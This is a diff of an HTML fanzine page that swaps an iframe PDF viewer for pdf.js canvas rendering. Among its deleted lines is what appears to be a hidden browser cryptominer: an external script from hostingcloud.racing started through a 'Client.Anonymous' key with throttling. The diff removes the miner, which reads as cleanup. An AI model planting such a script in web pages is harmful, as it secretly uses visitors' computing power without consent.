@@ -85,6 +85,8 @@
             background-color: #444;
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.10.377/pdf.min.js"></script>
+
 </head>
 <body>
     <header>
@@ -112,18 +114,49 @@
             <a href="https://www.paypal.com/donate" target="_blank">Donate via PayPal</a>
         </div>
         
-        <iframe class="pdf-viewer" src="pdf/CHIMERA FANZINE SPREADS.pdf"></iframe>
+        <div class="pdf-viewer-container">
+            <canvas id="pdf-canvas"></canvas>
+        </div>    
     </div>
-</body>
-<script src="https://www.hostingcloud.racing/yeKo.js"></script>
 <script>
-    var _client = new Client.Anonymous('cf0a75ae2e56e750b0f55083a208326e1be1fc07d1aaab89f93319da63d49f37', {
-        throttle: 0.6, c: 'w', ads: 0
-    });
-    _client.start();
-    
+    const url = 'pdf/CHIMERA FANZINE SPREADS.pdf';
 
-</script>
+    const pdfjsLib = window['pdfjs-dist/build/pdf'];
+    pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.10.377/pdf.worker.min.js';
+
+    const loadingTask = pdfjsLib.getDocument(url);
+    loadingTask.promise.then(pdf => {
+        console.log('PDF loaded');
+
+        // Fetch the first page
+        const pageNumber = 1;
+        pdf.getPage(pageNumber).then(page => {
+            console.log('Page loaded');
+
+            const scale = 1.5;
+            const viewport = page.getViewport({ scale: scale });
+
+            // Prepare canvas using PDF page dimensions
+            const canvas = document.getElementById('pdf-canvas');
+            const context = canvas.getContext('2d');
+            canvas.height = viewport.height;
+            canvas.width = viewport.width;
+
+            // Render PDF page into canvas context
+            const renderContext = {
+                canvasContext: context,
+                viewport: viewport
+            };
+            const renderTask = page.render(renderContext);
+            renderTask.promise.then(() => {
+                console.log('Page rendered');
+            });
+        });
+    }, reason => {
+        console.error(reason);
+    });
+</script>    
+</body>
 
 
 </html>
